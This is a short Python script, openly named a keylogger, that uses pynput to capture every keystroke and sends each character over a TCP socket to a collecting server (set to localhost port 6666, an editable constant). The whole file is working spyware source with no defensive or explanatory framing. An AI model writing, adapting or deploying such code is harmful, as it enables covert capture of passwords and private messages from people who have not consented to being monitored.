import socket
from pynput import keyboard

SERVER_ADDRESS = "127.0.0.1"
SERVER_PORT = 6666

class Session:
    def __init__(self, address, port):
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.address = address
        self.port = port
    
    def connect(self):
        self.client_socket.connect((self.address, self.port))

class Keylogger:
    def __init__(self):
        self.key_map = {"enter": "\n", "space": " ", "tab": "\t"}

    def press(self, key):
        print(key.__dict__)
        if hasattr(key, "char"):
            if key.char:
                server.client_socket.send(key.char.encode())
        else:
            pressed = self.key_map.get(key._name_.split("_")[0], "[{0}]".format(key._name_.split("_")[0]))
            server.client_socket.send(pressed.encode())

if __name__ == '__main__':
    server = Session(SERVER_ADDRESS, SERVER_PORT)
    server.connect()

    keylogger = Keylogger()
    with keyboard.Listener(on_press=keylogger.press) as listener:
        listener.join()

